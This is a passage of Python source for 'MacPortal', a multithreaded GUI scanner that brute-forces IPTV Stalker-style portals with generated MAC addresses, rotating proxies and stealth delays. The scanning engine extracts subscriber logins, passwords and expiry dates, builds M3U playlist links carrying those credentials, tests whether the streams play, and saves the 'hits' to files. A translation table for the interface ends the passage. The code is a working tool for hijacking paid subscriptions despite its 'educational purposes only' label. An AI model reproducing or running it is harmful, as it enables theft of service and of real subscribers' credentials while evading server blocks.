
    has_media = result.get('genres') or result.get('vod_categories') or result.get('series_categories')
    if has_media:
        lines.append(f"")
        lines.append(f"╔══ 🎶 🄼🄴🄳🄸🄰 ⚙️ 🄻🄸🅂🅃 🎶")

        if result.get('genres'):
            live_str = " ".join(f"«📺» {g}" for g in result['genres'])
            lines.append(f"╠☞ ʟɪᴠᴇʟɪsᴛᴀ")
            lines.append(f"╠☞  || {{ {live_str} }} ||")

        if result.get('vod_categories'):
            vod_str = " ".join(f"«🎬» {v}" for v in result['vod_categories'])
            lines.append(f"╠☞ ᴠᴏᴅʟɪsᴛ")
            lines.append(f"╠☞  || {{ {vod_str} }} ||")

        if result.get('series_categories'):
            series_str = " ".join(f"«🍿» {s}" for s in result['series_categories'])
            lines.append(f"╠☞ sᴇʀɪᴇsʟɪsᴛ")
            lines.append(f"╠☞  || {{ {series_str} }} ||")

        lines.append(f"        ⟁⃤  🚧─🔹️ 𝐸𝑛𝑑 𝑂𝑓 𝐻𝑖𝑡 🔹️─🚧  ⟁⃤")
        lines.append(f"╚════════ 🚧 ════════╝")
    return "\n".join(lines)


def _save_raw_response(mac, portal_host, data):
    """Save raw server responses to a JSON file for inspection.
    Only called for valid/expired hits to avoid clutter."""
    try:
        raw_dir = os.path.join(HITS_DIR, 'Raw')
        os.makedirs(raw_dir, exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_host = sanitize_filename(portal_host)[:50]
        safe_mac = mac.replace(':', '')
        filename = f"{safe_host}_{safe_mac}_{ts}.json"
        filepath = os.path.join(raw_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
# SCANNER ENGINE
# ═══════════════════════════════════════════════════════════
def safe_get(session, url, headers, proxy_pool, timeout=10, retries=10, proxies=None):
    if proxies is None:
        proxies, _ = proxy_pool.get_next() if proxy_pool else (None, "DIRECT")
    for attempt in range(retries):
        try:
            resp = session.get(url, headers=headers, proxies=proxies,
                               timeout=(3, timeout), verify=False)
            return resp, proxies
        except Exception:
            if proxy_pool:
                proxies, _ = proxy_pool.get_next()
    return None, proxies


def scan_one_mac(mac, portal_cfg, proxy_pool, timeout, log_fn):
    result = {
        'status': 'unknown',
        'mac': mac,
        'portal_host': portal_cfg.host,
        'portal_path': portal_cfg.path,
        'token': None,
        'expiry': '',
        'channel_count': 0,
        'vod_count': 0,
        'series_count': 0,
        'genres': [],
        'vod_categories': [],
        'series_categories': [],
        'real_server': portal_cfg.host,
        'm3u_link': '',
        'm3u_status': '',
        'mac_status': '',
        'vpn': '',
        'proxy_used': 'DIRECT',
        'scan_time_ms': 0,
        'error': None,
        'login': '',
        'password': '',
        'timezone': '',
        'raw_data': {},
    }

    t_start = time.time()
    session = requests.Session()

    if proxy_pool:
        proxies, proxy_label = proxy_pool.get_next()
        result['proxy_used'] = proxy_label
        if state.show_real_proxy_ip and proxy_label != "DIRECT":
            with state.lock:
                cache = dict(state.proxy_ip_cache)
            if proxy_label not in cache:
                threading.Thread(
                    target=_check_proxy_ip_background,
                    args=(proxy_label, proxies),
                    daemon=True,
                ).start()
    else:
        proxies = None
        result['proxy_used'] = "DIRECT"

    # === Phase 1: Handshake ===
    url = portal_cfg.handshake_url()
    headers = portal_cfg.make_headers(mac)
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if not resp:
        result['status'] = 'unreachable'
        result['error'] = 'Handshake failed (timeout)'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    if _is_cloudflare_block(resp):
        result['status'] = 'error'
        result['error'] = 'Cloudflare block - IP blocked by server'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    veri = resp.text
    if 'token":' not in veri and 'token\\":' not in veri:
        result['status'] = 'no_token'
        result['error'] = 'No token in handshake response'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    token = extract_json_field(veri, "token")
    if not token:
        result['status'] = 'no_token'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    result['token'] = token[:20] + "..." if len(token) > 20 else token

    random_val = ""
    if 'random' in veri:
        random_val = extract_json_field(veri, "random")

    # === Phase 2: Get Profile ===
    if not state.running:
        result['status'] = 'stopped'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    url = portal_cfg.profile_url(mac, random_val)
    headers = portal_cfg.make_headers(mac, token)
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if not resp:
        result['status'] = 'error'
        result['error'] = 'Profile request failed'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    veri = resp.text
    profile_id = ""
    try:
        profile_id = veri.split('{"js":{"id":')[1].split(',"name')[0]
    except Exception:
        pass

    profile_mac = ""
    try:
        profile_mac = veri.split('"mac":"')[1].split('"')[0]
    except Exception:
        pass
    if profile_id == "0" and not profile_mac and not portal_cfg.is_stalker and not portal_cfg.is_real_blue:
        rb_url = portal_cfg.profile_url_realblue(mac, random_val)
        if rb_url:
            resp_rb, proxies = safe_get(session, rb_url, headers, proxy_pool, timeout, proxies=proxies)
            if resp_rb and '"mac":"' in resp_rb.text:
                rb_mac = ""
                try:
                    rb_mac = resp_rb.text.split('"mac":"')[1].split('"')[0]
                except Exception:
                    pass
                if rb_mac:
                    veri = resp_rb.text
                    try:
                        profile_id = veri.split('{"js":{"id":')[1].split(',"name')[0]
                    except Exception:
                        pass

    ip_addr = extract_json_field(veri, "ip")
    expires = extract_json_field(veri, "expires")
    timezone = extract_json_field(veri, "default_timezone") or extract_json_field(veri, "timezone")
    if timezone:
        result['timezone'] = timezone

    result['raw_data']['profile_raw'] = veri

    login = ""
    password = ""
    parent_password = ""
    stb_type = ""
    expire_billing_date = ""

    if portal_cfg.is_stalker:
        login = extract_json_field(veri, "login")
        parent_password = extract_json_field(veri, "parent_password")
        password = extract_json_field(veri, "password")
        stb_type = extract_json_field(veri, "stb_type")
        expire_billing_date = extract_json_field(veri, "expire_billing_date")
        result['login'] = login
        result['password'] = password

    if profile_id == "null" and expires == "" and not portal_cfg.is_stalker:
        result['status'] = 'not_registered'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    # === Phase 3: Account Info ===
    if not state.running:
        result['status'] = 'stopped'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    url = portal_cfg.account_info_url()
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if resp:
        veri = resp.text
        if not result.get('timezone'):
            tz = extract_json_field(veri, "default_timezone") or extract_json_field(veri, "timezone")
            if tz:
                result['timezone'] = tz
        if 'phone' not in veri and 'end_date' not in veri and not expires and not expire_billing_date:
            result['status'] = 'not_registered'
            result['scan_time_ms'] = round((time.time() - t_start) * 1000)
            return result

        trh = ""
        if "phone" in veri:
            trh = extract_json_field(veri, "phone")
        if "end_date" in veri:
            trh = extract_json_field(veri, "end_date")
        if not trh and expires:
            trh = expires
        if not trh and portal_cfg.is_stalker:
            trh = expire_billing_date

        try:
            trh = timestamp_to_date(trh)
        except Exception:
            pass

        if '(-' in str(trh):
            result['status'] = 'expired'
            result['expiry'] = trh
            result['scan_time_ms'] = round((time.time() - t_start) * 1000)
            return result

        if trh and trh.lower()[:2] != 'un':
            try:
                days = days_remaining(trh)
                trh = f"{trh} {days} Days"
            except Exception:
                pass

        result['expiry'] = trh
        result['raw_data']['account_info_raw'] = veri

    # === Phase 4: Get Channels ===
    if not state.running:
        result['status'] = 'stopped'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    cid = "1842"
    url = portal_cfg.channels_url()
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if resp:
        result['raw_data']['channels_raw'] = resp.text
        try:
            if portal_cfg.is_stalker:
                cid = resp.text.split('id":"')[5].split('"')[0]
            else:
                cid = resp.text.split('ch_id":"')[5].split('"')[0]
        except Exception:
            pass
        for field in ("total_items", "total"):
            total_str = extract_json_field(resp.text, field)
            if total_str and total_str.isdigit():
                total_int = int(total_str)
                if total_int > 0:
                    result['channel_count'] = total_int
                    break
        if result.get('channel_count', 0) == 0:
            result['channel_count'] = resp.text.count('ch_id":"') if 'ch_id' in resp.text else resp.text.count('id":"')

    # === Phase 5: VOD + M3U Link Extraction ===
    user = ""
    pas = ""
    link = ""
    real = portal_cfg.host

    if expires or result['expiry']:
        url = portal_cfg.vod_list_url()
        resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
        if resp and 'cmd' in resp.text:
            cmd = extract_json_field(resp.text, 'cmd')
            if cmd:
                url = portal_cfg.vod_create_link_url(cmd)
                resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
                if resp and 'cmd":' in resp.text:
                    try:
                        link = resp.text.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
                        user = link.replace('movie/', '').split('/')[3]
                        real = f"{portal_cfg.http}://{link.split('://')[1].split('/')[0]}/c/"
                        pas = link.replace('movie/', '').split('/')[4]
                        cid = extract_json_field(resp.text, 'id')
                        m3u_host = real.replace('http://', '').replace('/c/', '').replace('https://', '')
                        result['m3u_link'] = (
                            f"http://{m3u_host}/get.php?username={user}&password={pas}"
                            f"&type=m3u_plus&output=m3u8"
                        )
                    except Exception:
                        pass

    # === Phase 6: Create Channel Link (if no M3U from VOD) ===
    if not result.get('m3u_link'):
        url = portal_cfg.create_link_url(cid)
        resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
        if resp:
            veri = resp.text
            try:
                if 'ffmpeg ' in veri:
                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                elif 'cmd":' in veri:
                    link = veri.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
                    user = login
                    pas = password
                    real = f"{portal_cfg.http}://{link.split('://')[1].split('/')[0]}/c/"

                if 'ffmpeg ' in veri:
                    user = link.replace('live/', '').split('/')[3]
                    pas = link.replace('live/', '').split('/')[4]
                    if real == portal_cfg.host:
                        real = f"{portal_cfg.http}://{link.split('://')[1].split('/')[0]}/c/"

                m3u_host = real.replace('http://', '').replace('/c/', '').replace('https://', '')
                result['m3u_link'] = (
                    f"http://{m3u_host}/get.php?username={user}&password={pas}"
                    f"&type=m3u_plus&output=m3u8"
                )
            except Exception:
                pass

    # === Phase 7: Check streaming status ===
    if link:
        try:
            stream_headers = {
                "Icy-MetaData": "1",
                "User-Agent": "Lavf/57.83.100",
                "Accept-Encoding": "identity",
                "Host": portal_cfg.host,
                "Accept": "*/*",
                "Range": "bytes=0-",
                "Connection": "close",
            }
            stream_url = f"{portal_cfg.http}://{real.replace('http://', '').replace('/c/', '').replace('https://', '')}/live/{user}/{pas}/{cid}.ts"
            stream_proxies, _ = proxy_pool.get_next() if proxy_pool else (None, "DIRECT")
            resp = requests.get(stream_url, headers=stream_headers, timeout=5,
                                allow_redirects=False, stream=True, proxies=stream_proxies, verify=False)
            if resp.status_code in (302, 406):
                result['mac_status'] = 'Online'
            else:
                result['mac_status'] = 'Locked'
        except Exception:
            result['mac_status'] = 'Locked'
    else:
        result['mac_status'] = 'No link'

    # === Phase 8: Get Genres ===
    if not state.running:
        result['status'] = 'stopped'
        result['scan_time_ms'] = round((time.time() - t_start) * 1000)
        return result

    url = portal_cfg.genres_url()
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if resp:
        veri = resp.text
        genres = []
        if 'title":"' in veri:
            for part in veri.split('title":"'):
                try:
                    title = part.split('"')[0]
                    title = title.encode('utf-8').decode("unicode-escape").replace('\\/', '/')
                    genres.append(title)
                except Exception:
                    pass
        result['genres'] = genres[1:] if genres else []
        result['raw_data']['genres_raw'] = veri

    # === Phase 9: VOD & Series Categories ===
    url = portal_cfg.vod_categories_url()
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if resp and 'title":"' in resp.text:
        result['vod_count'] = resp.text.count('title":"')

    url = portal_cfg.series_categories_url()
    resp, proxies = safe_get(session, url, headers, proxy_pool, timeout, proxies=proxies)
    if resp and 'title":"' in resp.text:
        result['series_count'] = resp.text.count('title":"')

    # === Phase 10: VPN Check ===
    if ip_addr:
        result['vpn'] = check_vpn(ip_addr)
    else:
        result['vpn'] = 'No client IP'

    result['real_server'] = real
    result['scan_time_ms'] = round((time.time() - t_start) * 1000)

    # === Determine Status ===
    has_data = (result['channel_count'] > 0 or result['expiry']
                or result['m3u_link'])

    if result['expiry'] and result['expiry'] not in ('', 'Unknown'):
        try:
            exp_str = result['expiry'].split(' ')[0] + ' ' + result['expiry'].split(' ')[1]
            exp_dt = datetime.datetime.strptime(exp_str, '%d-%m-%Y %H:%M:%S')
            if exp_dt < datetime.datetime.now():
                result['status'] = 'expired'
            else:
                result['status'] = 'valid'
        except Exception:
            result['status'] = 'valid' if has_data else 'not_registered'
    elif has_data:
        result['status'] = 'valid'
    else:
        result['status'] = 'not_registered'

    if state.raw_easter_egg_enabled and result['status'] in ('valid', 'expired') and result.get('raw_data'):
        _save_raw_response(mac, portal_cfg.host, {
            'mac': mac,
            'portal': portal_cfg.host,
            'status': result['status'],
            'timestamp': datetime.datetime.now().isoformat(),
            **result['raw_data'],
        })

    return result


def run_scanner(config, log_fn, progress_fn, done_fn):
    try:
        state.reset()
        state.running = True

        portals = config.get('portals', [])
        if not portals:
            log_fn("ERROR: No portals configured!", "error")
            state.running = False
            return

        portal_configs = []
        for p in portals:
            pc = PortalConfig(p['url'], p['type'])
            portal_configs.append(pc)
            log_fn(f"Portal: {p['url']} -> {pc.path} ({pc.http})", "info")

        macs = []
        if config.get('mac_source') == 'single':
            macs = [normalize_mac(config.get('single_mac', ''))]
            log_fn(f"Single MAC scan: {macs[0]}", "info")
        elif config.get('mac_source') == 'file':
            macs = load_macs_from_file(config['mac_file'])
            log_fn(f"Loaded {len(macs)} MACs from file", "info")
        else:
            prefix = config.get('mac_prefix', '00:1A:79:')
            count = config.get('mac_count', 1000)
            serial_prefix = config.get('serial_prefix', '')
            if config.get('mac_combo') == 'cascading':
                macs = generate_cascading_macs(prefix, count, serial_prefix)
            else:
                macs = generate_random_macs(prefix, count, serial_prefix)
            log_fn(f"Generated {len(macs)} MACs ({config.get('mac_combo', 'random')})", "info")

        if config.get('randomize_order', True):
            random.shuffle(macs)

        state.total_macs = len(macs)
        state.total_portals = len(portal_configs)
        total = len(macs) * len(portal_configs)
        log_fn(f"Starting scan: {len(macs)} MACs x {len(portal_configs)} portals = {total} total", "info")

        proxy_pool = None
        if config.get('use_proxy') and config.get('proxy_file'):
            proxy_list = load_proxies(config['proxy_file'], config.get('proxy_type', 'Socks5'))
            if proxy_list:
                proxy_pool = ProxyPool(proxy_list)
                log_fn(f"Loaded {proxy_pool.count} proxies ({config.get('proxy_type', 'Socks5')})", "success")
            else:
                log_fn("WARNING: No proxies loaded. Proceeding with DIRECT connection.", "warning")
        else:
            log_fn("Proxy mode: DIRECT (no proxy)", "warning")

        nick = config.get('nick', 'Unknown')
        first_host = portal_configs[0].host if portal_configs else 'unknown'
        hit_file = os.path.join(HITS_DIR, f"MacPortal_{sanitize_filename(first_host)}_{sanitize_filename(nick)}_hits.txt")

        def report_writer():
            while state.running or not state.queue.empty():
                try:
                    found = state.queue.get(timeout=2.0)
                    hit_text = format_hit(found, nick)
                    with open(hit_file, 'a', encoding='utf-8') as f:
                        f.write(hit_text)
                        f.flush()
                    state.queue.task_done()
                except queue.Empty:
                    continue
                except Exception:
                    continue

        writer_thread = threading.Thread(target=report_writer, daemon=True)
        writer_thread.start()

        bots = config.get('bots', 1)
        timeout = config.get('timeout', 10)
        mac_queue = queue.Queue()
        for m in macs:
            mac_queue.put(m)

        def worker():
            while state.running:
                state.pause_event.wait()
                if not state.running:
                    break
                try:
                    mac = mac_queue.get_nowait()
                except queue.Empty:
                    break

                for pc in portal_configs:
                    if not state.running:
                        break
                    state.pause_event.wait()
                    if not state.running:
                        break

                    result = scan_one_mac(mac, pc, proxy_pool, timeout, log_fn)
                    result['timestamp'] = datetime.datetime.now().isoformat()
                    state.add_result(result)

                    status = result['status']
                    ms = result.get('scan_time_ms', 0)
                    proxy = result.get('proxy_used', '?')
                    base = "stalker_portal/c/" if pc.is_stalker else "c/"

                    if status in ('valid', 'expired'):
                        play_hit_sound()
                        exp = result.get('expiry', '')
                        ch = result.get('channel_count', 0)
                        msg = f"HIT: {mac} @ {pc.host}/{base}    [{pc.path}]  -> {status.upper()}"
                        if exp:
                            msg += f" (exp: {exp})"
                        if ch:
                            msg += f" [{ch}ch]"
                        msg += f" [{ms}ms via {proxy}]"
                        if state.show_real_proxy_ip and proxy != "DIRECT":
                            with state.lock:
                                ip_info = state.proxy_ip_cache.get(proxy)
                            if ip_info:
                                msg += f" [IP: {ip_info}]"
                            else:
                                msg += " [IP: checking...]"
                        log_fn(msg, "success")
                    elif status == 'not_registered':
                        msg = f"Token only: {mac} @ {pc.host}/{base}    [{pc.path}] [{ms}ms]"
                        if state.show_real_proxy_ip and proxy != "DIRECT":
                            with state.lock:
                                ip_info = state.proxy_ip_cache.get(proxy)
                            if ip_info:
                                msg += f" [IP: {ip_info}]"
                            else:
                                msg += " [IP: checking...]"
                        log_fn(msg, "debug")
                    elif status == 'stopped':
                        break
                    else:
                        err = result.get('error', '')
                        msg = f"Miss: {mac} @ {pc.host}/{base}    [{pc.path}] -> {err} [{ms}ms]"
                        if state.show_real_proxy_ip and proxy != "DIRECT":
                            with state.lock:
                                ip_info = state.proxy_ip_cache.get(proxy)
                            if ip_info:
                                msg += f" [IP: {ip_info}]"
                            else:
                                msg += " [IP: checking...]"
                        log_fn(msg, "debug")

                    done, total = state.get_progress()
                    progress_fn(done, total)

                    stealth = config.get('stealth_delay', 0)
                    if stealth > 0:
                        time.sleep(random.uniform(0.5, stealth))

                mac_queue.task_done()

        threads = []
        for _ in range(bots):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        state.queue.join()
        log_fn(f"Scan complete. Found: {state.found_count}, Errors: {state.error_count}", "success")

    except Exception as e:
        log_fn(f"CRITICAL ERROR: {e}", "error")
    finally:
        state.running = False
        state.paused = False
        state.pause_event.set()
        done_fn()


# ═══════════════════════════════════════════════════════════
# TRANSLATIONS
# ═══════════════════════════════════════════════════════════
TRANSLATIONS = {
    "en": {
        "app_title": "MacPortal - MAC Scanner",
        "tab_setup": "Setup",
        "tab_results": "Results",
        "tab_log": "Log",
        "section_general": "General",
        "nick_label": "Nick (shown in hits):",
        "section_portals": "Portals",
        "portal_url": "Portal URL:",
        "btn_detect": "Detect",
        "btn_add": "Add",
        "btn_edit": "Edit",
        "btn_remove": "Remove",
        "btn_clear": "Clear",
        "btn_load_list": "Load List",
        "btn_save_list": "Save List",
        "portal_type": "Portal type:",
        "section_mac": "MAC Settings",
        "mac_source": "MAC source:",
        "mac_prefix": "MAC prefix:",
        "combination": "Combination:",
        "serial_prefix": "MAC suffix (hex):",
        "mac_count": "Number of MACs:",
        "mac_file_label": "MAC file (from combo/):",
        "btn_browse": "Browse",
        "section_proxy": "Proxy",
        "use_proxy": "Use proxy",
        "proxy_file_label": "Proxy file (from Proxies/):",
        "proxy_type": "Proxy type:",
        "section_advanced": "Advanced",
        "bots_label": "Bots (threads):",
        "timeout_label": "Timeout (sec):",
        "stealth_label": "Stealth delay (sec, 0=off):",
        "btn_start": "Start",
        "btn_pause": "Pause",
        "btn_resume": "Resume",
        "btn_stop": "Stop",
        "status_ready": "Ready",
        "status_scanning": "Scanning...",
        "status_stopping": "Stopping...",
        "status_paused": "Paused",
        "status_done": "Done. Found: {found}",
        "scan_done_title": "Scan Complete",
        "scan_done_msg": "{found} hit(s) found.\n\nSee the Results tab for details.\nAll hits are saved in the Hits folder.",
        "scan_done_multi": "{found} hit(s) found.\n\nSee the Results tab for details.\nCheck the Log tab to see which portal type got the hit.\nAll hits are saved in the Hits folder.",
        "summary_format": "Valid: {valid} | Expired: {expired} | Errors: {errors} | Hits: {total}",
        "btn_export": "Export",
        "menu_language": "Language",
        "menu_file": "File",
        "menu_exit": "Exit",
        "menu_help": "Help",
        "menu_about": "About",
        "warn_missing_url": "Enter a portal URL first.",
        "warn_missing_portal": "Add at least one portal!",
        "warn_missing_mac_file": "Select a MAC file from combo/ folder!",
        "warn_auto_detect_failed": "Could not auto-detect portal type. Please select manually.",
        "warn_cloudflare": "Cloudflare block detected!\nYour IP address is blocked by this server.\nTry using a proxy or VPN.",
        "warn_no_title": "No Results",
        "warn_no_results": "No results to export yet.",
        "info_portal_added": "Portal added: {url} ({ptype})",
        "info_portal_updated": "Portal updated: {url} ({ptype})",
        "info_editing_portal": "Editing portal: {url}. Change fields and click Add to save.",
        "info_portal_removed": "Portal removed.",
        "info_portals_cleared": "Portal list cleared.",
        "info_portals_loaded": "Loaded {count} portal(s) from {filename}",
        "info_portals_saved": "Saved {count} portal(s) to {filename}",
        "info_detecting": "Auto-detecting portal type for {url}...",
        "info_detected": "Detected: {result}",
        "info_scan_resumed": "Scan resumed",
        "info_scan_paused": "Scan paused",
        "info_stopping": "Stopping scan...",
        "error_load_portals": "Error loading portals: {error}",
        "error_save_portals": "Error saving portals: {error}",
        "col_mac": "MAC",
        "col_portal": "Portal",
        "col_status": "Status",
        "col_expiry": "Expiry",
        "col_channels": "Ch",
        "col_proxy": "Proxy",
        "col_time": "ms",
        "ctx_copy_mac": "Copy MAC: {value}",
        "ctx_copy_portal": "Copy Portal: {value}",
        "ctx_copy_details": "Copy full details",
        "ctx_paste": "Paste",
        "ctx_copy": "Copy",
        "ctx_cut": "Cut",
        "ctx_select_all": "Select All",
        "about_text": "MacPortal v2.0\nMAC Scanner with GUI\nEducational purposes only.",
        "no_files": "(no files)",
        "random": "Random",
        "single": "Single",
        "file": "File",
        "single_mac_label": "MAC address:",
        "warn_missing_mac": "Enter a valid MAC address!",
        "warn_scan_active": "Cannot test while a scan is running.",
        "warn_invalid_mac": "Please enter a valid MAC address.",
    },
    "fr": {
        "app_title": "MacPortal - Scanner MAC",
        "tab_setup": "Configuration",
        "tab_results": "Resultats",
        "tab_log": "Journal",
        "section_general": "General",
        "nick_label": "Pseudo (affiche dans les hits):",
        "section_portals": "Portails",
        "portal_url": "URL du portail:",
        "btn_detect": "Detecter",
        "btn_add": "Ajouter",
        "btn_edit": "Modifier",
        "btn_remove": "Supprimer",
        "btn_clear": "Effacer",
        "btn_load_list": "Charger liste",
        "btn_save_list": "Sauver liste",
        "portal_type": "Type de portail:",
        "section_mac": "Parametres MAC",
        "mac_source": "Source MAC:",
        "mac_prefix": "Prefixe MAC:",
        "combination": "Combinaison:",
        "serial_prefix": "Suffixe MAC (hex):",
        "mac_count": "Nombre de MACs:",
        "mac_file_label": "Fichier MAC (de combo/):",
        "btn_browse": "Parcourir",
        "section_proxy": "Proxy",
        "use_proxy": "Utiliser proxy",
        "proxy_file_label": "Fichier proxy (de Proxies/):",
        "proxy_type": "Type de proxy:",
        "section_advanced": "Avance",
        "bots_label": "Bots (threads):",
        "timeout_label": "Timeout (sec):",
        "stealth_label": "Delai furtif (sec, 0=off):",
        "btn_start": "Demarrer",
        "btn_pause": "Pause",
        "btn_resume": "Reprendre",
        "btn_stop": "Arreter",
        "status_ready": "Pret",
        "status_scanning": "Scan en cours...",
        "status_stopping": "Arret en cours...",
        "status_paused": "En pause",
        "status_done": "Termine. Trouve: {found}",
        "scan_done_title": "Scan termine",
        "scan_done_msg": "{found} resultat(s) trouve(s).\n\nVoir l'onglet Resultats pour plus de details.\nTous les resultats sont sauvegardes dans le dossier Hits.",
        "scan_done_multi": "{found} resultat(s) trouve(s).\n\nVoir l'onglet Resultats pour plus de details.\nConsultez l'onglet Log pour voir quel type de portail a obtenu le resultat.\nTous les resultats sont sauvegardes dans le dossier Hits.",
        "summary_format": "Valide: {valid} | Expire: {expired} | Erreurs: {errors} | Hits: {total}",
        "btn_export": "Exporter",
        "menu_language": "Langue",
        "menu_file": "Fichier",
        "menu_exit": "Quitter",
        "menu_help": "Aide",
        "menu_about": "A propos",
        "warn_missing_url": "Entrez une URL de portail d'abord.",
        "warn_missing_portal": "Ajoutez au moins un portail!",
        "warn_missing_mac_file": "Selectionnez un fichier MAC du dossier combo/!",
        "warn_auto_detect_failed": "Impossible de detecter le type de portail. Selectionnez manuellement.",
        "warn_cloudflare": "Blocage Cloudflare detecte!\nVotre adresse IP est bloquee par ce serveur.\nEssayez d'utiliser un proxy ou un VPN.",
        "warn_no_title": "Pas de resultats",
        "warn_no_results": "Aucun resultat a exporter.",
        "info_portal_added": "Portail ajoute: {url} ({ptype})",
        "info_portal_updated": "Portail mis a jour: {url} ({ptype})",
        "info_editing_portal": "Edition du portail: {url}. Modifiez et cliquez Ajouter pour sauver.",
        "info_portal_removed": "Portail supprime.",
        "info_portals_cleared": "Liste des portails effacee.",
        "info_portals_loaded": "Charge {count} portail(s) depuis {filename}",
        "info_portals_saved": "Sauve {count} portail(s) dans {filename}",
        "info_detecting": "Detection automatique du type de portail pour {url}...",
        "info_detected": "Detecte: {result}",
        "info_scan_resumed": "Scan repris",
        "info_scan_paused": "Scan en pause",
        "info_stopping": "Arret du scan...",
        "error_load_portals": "Erreur de chargement des portails: {error}",
        "error_save_portals": "Erreur de sauvegarde des portails: {error}",
        "col_mac": "MAC",
        "col_portal": "Portail",
        "col_status": "Statut",
        "col_expiry": "Expiration",
        "col_channels": "Ch",
        "col_proxy": "Proxy",
        "col_time": "ms",
        "ctx_copy_mac": "Copier MAC: {value}",
        "ctx_copy_portal": "Copier Portail: {value}",
        "ctx_copy_details": "Copier details complets",
        "ctx_paste": "Coller",
        "ctx_copy": "Copier",
        "ctx_cut": "Couper",
        "ctx_select_all": "Tout selectionner",
        "about_text": "MacPortal v1.0\nScanner MAC avec GUI\nUsage educatif uniquement.",
        "no_files": "(aucun fichier)",
        "random": "Aleatoire",
        "single": "Unique",
        "file": "Fichier",
        "single_mac_label": "Adresse MAC:",
        "warn_missing_mac": "Entrez une adresse MAC valide!",
        "warn_scan_active": "Impossible de tester pendant un scan.",
        "warn_invalid_mac": "Veuillez entrer une adresse MAC valide.",
    },
    "es": {
        "app_title": "MacPortal - Escaner MAC",
        "tab_setup": "Configuracion",
        "tab_results": "Resultados",
        "tab_log": "Registro",
        "section_general": "General",
        "nick_label": "Apodo (mostrado en hits):",
        "section_portals": "Portales",
        "portal_url": "URL del portal:",
        "btn_detect": "Detectar",
        "btn_add": "Agregar",
        "btn_edit": "Editar",
        "btn_remove": "Eliminar",
        "btn_clear": "Limpiar",
        "btn_load_list": "Cargar lista",
        "btn_save_list": "Guardar lista",
        "portal_type": "Tipo de portal:",
        "section_mac": "Configuracion MAC",
        "mac_source": "Fuente MAC:",
        "mac_prefix": "Prefijo MAC:",
        "combination": "Combinacion:",
        "serial_prefix": "Sufijo MAC (hex):",
        "mac_count": "Cantidad de MACs:",
        "mac_file_label": "Archivo MAC (de combo/):",
        "btn_browse": "Examinar",
        "section_proxy": "Proxy",
        "use_proxy": "Usar proxy",
        "proxy_file_label": "Archivo proxy (de Proxies/):",
        "proxy_type": "Tipo de proxy:",
        "section_advanced": "Avanzado",
        "bots_label": "Bots (hilos):",
        "timeout_label": "Timeout (seg):",
        "stealth_label": "Retardo sigiloso (seg, 0=off):",
        "btn_start": "Iniciar",
        "btn_pause": "Pausar",
        "btn_resume": "Reanudar",
        "btn_stop": "Detener",
        "status_ready": "Listo",
        "status_scanning": "Escaneando...",
        "status_stopping": "Deteniendo...",
        "status_paused": "En pausa",
        "status_done": "Hecho. Encontrados: {found}",
        "scan_done_title": "Escaneo completado",
        "scan_done_msg": "{found} resultado(s) encontrado(s).\n\nVea la pestana Resultados para mas detalles.\nTodos los resultados se guardan en la carpeta Hits.",
        "scan_done_multi": "{found} resultado(s) encontrado(s).\n\nVea la pestana Resultados para mas detalles.\nConsulte la pestana Log para ver que tipo de portal obtuvo el resultado.\nTodos los resultados se guardan en la carpeta Hits.",
        "summary_format": "Validos: {valid} | Expirados: {expired} | Errores: {errors} | Hits: {total}",
        "btn_export": "Exportar",
        "menu_language": "Idioma",
        "menu_file": "Archivo",
        "menu_exit": "Salir",
        "menu_help": "Ayuda",
        "menu_about": "Acerca de",
        "warn_missing_url": "Ingrese una URL de portal primero.",
        "warn_missing_portal": "Agregue al menos un portal!",
        "warn_missing_mac_file": "Seleccione un archivo MAC de la carpeta combo/!",
        "warn_auto_detect_failed": "No se pudo detectar el tipo de portal. Seleccione manualmente.",
        "warn_cloudflare": "Bloqueo de Cloudflare detectado!\nSu direccion IP esta bloqueada por este servidor.\nIntente usar un proxy o VPN.",
        "warn_no_title": "Sin resultados",
        "warn_no_results": "No hay resultados para exportar.",
        "info_portal_added": "Portal agregado: {url} ({ptype})",
        "info_portal_updated": "Portal actualizado: {url} ({ptype})",
        "info_editing_portal": "Editando portal: {url}. Cambie los campos y haga clic en Agregar para guardar.",
        "info_portal_removed": "Portal eliminado.",
        "info_portals_cleared": "Lista de portales limpiada.",
        "info_portals_loaded": "Cargados {count} portal(es) desde {filename}",
        "info_portals_saved": "Guardados {count} portal(es) en {filename}",
        "info_detecting": "Detectando tipo de portal para {url}...",
        "info_detected": "Detectado: {result}",
        "info_scan_resumed": "Escaneo reanudado",
        "info_scan_paused": "Escaneo pausado",
        "info_stopping": "Deteniendo escaneo...",
        "error_load_portals": "Error al cargar portales: {error}",
        "error_save_portals": "Error al guardar portales: {error}",
        "col_mac": "MAC",
        "col_portal": "Portal",
        "col_status": "Estado",
        "col_expiry": "Expira",
        "col_channels": "Ch",
        "col_proxy": "Proxy",
        "col_time": "ms",
